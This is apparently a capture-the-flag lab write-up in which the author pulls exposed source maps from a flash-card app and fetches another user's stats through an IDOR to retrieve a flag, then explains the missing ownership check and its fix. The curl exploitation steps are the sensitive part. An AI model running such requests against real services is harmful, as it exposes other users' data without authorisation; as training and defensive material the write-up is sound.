---
title: Tanuki - Stats IDOR
tags:
  - bugforge
  - idor
  - broken-access-control
  - source-maps
---

- Hint said "WebSockets are fun" but the actual vuln was a stats IDOR -- the hint was wrong for this instance
- Socket.io was bundled in the client JS as dead code (no component uses it, no server endpoint exists)
- Flag was in `GET /api/stats/1` -- one request after reading source maps

## Step 1 -- Open the Lab

- Navigate to the BugForge lab URL (Tanuki -- SRS Flash Cards app)
- Note the base URL, e.g. `https://lab-XXXX.labs-app.bugforge.io`

## Step 2 -- Source Maps

- Open browser DevTools -> Sources, or fetch the JS bundle directly
- The app ships with source maps exposed at `/static/js/main.XXXXX.js.map`

```bash
# Grab the main page to find the JS bundle filename
curl -sk https://TARGET/ | grep -oP 'src="/static/js/[^"]+'
# Output: src="/static/js/main.3b4ae99e.js"

# Fetch the source map
curl -sk https://TARGET/static/js/main.3b4ae99e.js.map -o sourcemap.json
```

- The source map contains the original React component source code
- The key file is `UserStats.js` which contains this line:

```javascript
const response = await axios.get(`/api/stats/${user.id}`);
```

- This tells us the stats endpoint takes a user ID in the URL path -- classic IDOR pattern

## Step 3 -- Register a User

```bash
curl -sk https://TARGET/api/register -H "Content-Type: application/json" -d '{"username":"testuser1","email":"test1@test.com","password":"Password123","full_name":"Test User"}'
```

Response:

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJpYXQiOjE3NzQ5NDUzNTZ9.BgEFmvj962SBT98meVZOFeMzo8515uz4UrbD1ryvwMc",
  "user": {"id": 4, "username": "testuser1", "email": "test1@test.com", "full_name": "Test User"}
}
```

- Save the `token` value -- you'll need it for the next step
- Your user ID is `4` (first 3 are pre-seeded: likely admin + 2 default users)

## Step 4 -- IDOR on Stats (The Flag)

Use your token to request user 1's stats:

```bash
curl -sk https://TARGET/api/stats/1 -H "Authorization: Bearer YOUR_TOKEN_HERE"
```

Response:

```json
{
  "total_cards_studied": 0,
  "cards_mastered": 0,
  "total_reviews": null,
  "sessions_this_week": 0,
  "cards_studied_this_week": 0,
  "achievement_flag": "bug{XXXXX...}"
}
```

- User 1 (the admin/seed account) has an `achievement_flag` field in their stats
- This field doesn't appear for regular users
- The server doesn't check that the ID in the URL belongs to the authenticated user

For comparison, your own stats (`/api/stats/4`) return the same structure but without the flag field.

## Step 5 -- Submit the Flag

Copy the `achievement_flag` value and submit it.

## Alternative: Burp Suite

If you're using Burp:

1. Register through the browser (Burp captures the JWT in the response)
2. In Repeater, send: `GET /api/stats/1` with `Authorization: Bearer <your-token>`
3. Flag is in the response body

## What the Hint Was About

- The lab hint said "WebSockets are fun"
- Socket.io client library (`engine.io-client`, `socket.io-parser`) is bundled in the JS
- No React component imports or uses socket.io -- it's dead code
- No socket.io server endpoint exists (all paths return SPA catch-all HTML)
- The hint was misleading for this particular challenge variant

## Other Tests (Not Required for Flag)

| Test | Result |
|------|--------|
| Mass assignment (`role: admin` on register) | 200 but no admin privileges |
| Admin endpoints (`/api/admin/users`) as regular user | 403 "Admin access required" |
| JWT: HS256, no expiry, no role claim | No quick-win (none alg not needed) |

## Security Takeaways

### Vulnerability

- IDOR on `GET /api/stats/:id`
- CWE-639 -- Authorization Bypass Through User-Controlled Key
- OWASP A01:2021 -- Broken Access Control

### Root Cause

The stats endpoint uses the user ID from the URL path to query the database. It verifies the JWT is valid (authentication) but never checks that the requested ID matches the authenticated user (authorization).

```javascript
// VULNERABLE
app.get('/api/stats/:id', authMiddleware, (req, res) => {
  const stats = getStats(req.params.id);  // trusts URL param
  res.json(stats);
});

// SECURE
app.get('/api/stats/me', authMiddleware, (req, res) => {
  const stats = getStats(req.user.id);  // uses JWT identity
  res.json(stats);
});
```

### Prevention

- Use the authenticated user's ID from the JWT, not from URL parameters
- If you must use URL params (e.g. admin viewing other users), add an ownership/role check
- Prefer `/api/stats/me` pattern over `/api/stats/:id`
